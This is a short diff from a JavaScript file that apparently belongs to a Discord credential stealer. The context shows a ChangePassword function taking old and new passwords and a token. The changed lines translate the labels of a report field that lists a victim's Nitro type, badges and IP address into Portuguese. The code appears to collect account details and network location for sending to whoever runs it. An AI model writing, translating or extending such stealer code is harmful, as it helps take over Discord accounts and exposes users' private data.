@@ -205,8 +205,8 @@ function ChangePassword(oldpassword, newpassword, token) {
                                 "inline": true
                             },
                             {
-                                "name": "**Other Info**",
-                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Outras informações**",
+                                "value": `Tipo Nitro: ${GetNitro(json.premium_type)}\nEmblemas: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
